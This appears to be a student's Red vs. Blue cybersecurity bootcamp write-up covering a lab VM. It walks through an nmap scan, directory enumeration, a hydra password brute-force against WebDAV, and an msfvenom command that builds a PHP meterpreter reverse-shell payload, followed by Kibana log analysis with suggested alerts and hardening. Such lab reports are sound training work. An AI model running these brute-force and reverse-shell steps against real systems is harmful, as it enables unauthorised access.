# UCLA Cyber Security Boot Camp Project II - Red vs. Blue Engagement
## by Kurt Anderson

In this project I will work on a Red Team vs. Blue Team scenario in which I will play the roles of both Pentester and Security Operations Center Analyst.

![Network Topology](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/Project2Topology.png)

As the Red Team, I will attack a vulnerable VM within my created virtual environment, ultimately gaining root access to the machine.
As the Blue Team, I will use Kibana to review logs taken during the Red Team engagement. I will then use the logs to extract hard data and visulaizations for my report, using it to interpret my log data to suggest mitigation measures for each exploit that I've successfully performed as a Pentester.

Day 1 Activity File: Red Team

Complete the following to find the flag:

●	Discover the IP address of the Linux web server.

Command:
	
	nmap -v 192.168.1.0/24 
  
  ![nmap scan of 192.168.1.0/24](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/nmap_scan.jpg)
  
IP address found:
  
	192.168.1.90
	
●	Locate the hidden directory on the web server.

I used dirb to enumerate any directories and identify the hidden folder.

![dirb directory enumeration](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/dirb_enumeration.jpg)
 
●	Brute force the password for the hidden directory using the hydra command:

![Hydra Brute Force](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/hydra.jpg)

Using the username and password I was able to log into the host and found a Personal Note:

Command:

	hydra -l ashton -P /usr/share/wordlists/rockyou.txt webdav://192.168.1.90:80/

![Personal Note:](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/personal_note.jpg)

●	Break the hashed password with the Crack Station website or John the Ripper.
 
![Cracked Password:](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/cracked_password.jpg)

●	Connect to the server via WebDav.

![WebDAV Credentials](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/webdav_login.PNG)

●	Upload a PHP reverse shell payload.
Command: 

	msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 raw > reverse_shell.php

![Payload](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/msvenom.jpg)
![WebDAV File Manager](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/webdav_reverse_shell.jpg)
![WebDAV Browswer](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/webdav_upload.jpg)
 
●	Execute the payload that you uploaded to the site to open up a meterpreter session.

![Exploit Payload](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/payload.jpg)
![Exploitation](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/exploitation.jpg)

●	Find and capture the flag.

![Flag Found](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/meterpreter.jpg)


Day 2 Activity File: Incident Analysis with Kibana

 
After creating your dashboard and becoming familiar with the search syntax, use these tools to answer the questions below:

1.	Identify the offensive traffic.
![Dashboard](https://github.com/kurtxavier11/UCLA_Project_II/blob/main/images/Kibana_analysis.PNG)

○	Identify the traffic between your machine and the web machine:

	■	When did the interaction occur?

		The interaction occurred on 2021-12-14 03:00

	■	What responses did the victim send back?

		200, 207, 401, 404, 206, 304, 301

	■	What data is concerning from the Blue Team perspective?

		The status code ‘OK’ signifying that there was a completed request from the source IP and a response from the destination IP
 

2.	Find the request for the hidden directory.

○	In your attack, you found a secret folder. Let's look at that interaction between these two machines.

	■	How many requests were made to this directory? At what time and from which IP address(es)?

		There were 16,721 requests made to the directory /secret_folder, at 03:45 from the IP address 192.168.1.90.

	■	Which files were requested? What information did they contain?

		The file that was requested is the reverse_shell.php file

	■	What kind of alarm would you set to detect this behavior in the future?

		To detect this behavior in the future, I would set an alert to send an email with a high priority to notify the SOC that this type of request was made to access confidential company folders and data. 

	■	Identify at least one way to harden the vulnerable machine that would mitigate this attack.

		One way to harden the vulnerable machine that would mitigate this attack would be to ensure that the device has been updated and patched regularly in order to mitigate the exploitation of common system vulnerabilities.

3.	Identify the brute force attack.

○	After identifying the hidden directory, you used Hydra to brute-force the target server. Answer the following questions:
	
	■	Can you identify packets specifically from Hydra?

		Yes, by searching the ‘user_agent.original” field. 

	■	How many requests were made in the brute-force attack?

		There were 16,711 requests
 
	■	How many requests had the attacker made before discovering the correct password in this one?

		It appears that there were 16,711 requests before the correct password was discovered.
 

	■	What kind of alarm would you set to detect this behavior in the future and at what threshold(s)?

		I would set an alert to email the SOC that the login threshold has been surpassed in a certain amount of time. 


	■	Identify at least one way to harden the vulnerable machine that would mitigate this attack.
		
		Upon searching through the logs it appeared that most of these requests happened through port 80 on the target machine, so I would suggest to place a firewall to filter out packets coming from outdated user agents like Mozilla 4.0, or close port 80 entirely.
	
4.	Find the WebDav connection.

○	Use your dashboard to answer the following questions:

	■	How many requests were made to this directory?

		209 requests were made to the 192.168.1.105/webdav/ directory.
 

	■	Which file(s) were requested?

		XML files were requested, based on the HTTP request method ‘propfind’, and the status code of 207, which is a response used by webdav servers.

	■	What kind of alarm would you set to detect such access in the future?

		An alarm to alert the SOC of any PROPFIND requests for Webdav.

	■	Identify at least one way to harden the vulnerable machine that would mitigate this attack.

		One way to harden the vulnerable machine from PROPFIND is to use multi-factor authentication to help prevent brute-force attacks on webdav logins.

5.	Identify the reverse shell and meterpreter traffic.

○	To finish off the attack, you uploaded a PHP reverse shell and started a meterpreter shell session. Answer the following questions:
	
	■	Can you identify traffic from the meterpreter session?
 
		There was a spike in activity from the source IP address 192.168.1.90, which potentially shows that the target machine 192.168.1.105 had been breached, since they share similar patterns in activity. 

	■	What kinds of alarms would you set to detect this behavior in the future?
		
		An alert that has a minimum threshold of packet traffic to alert the SOC of any spikes in activity, and is monitored every hour. 

	■	Identify at least one way to harden the vulnerable machine that would mitigate this attack.
		
		In order to harden the vulnerable machine to mitigate this attack, I suggest that we require authentication in order to upload files to the webdav server, as well as defining the valid file extension types allowed on the server.
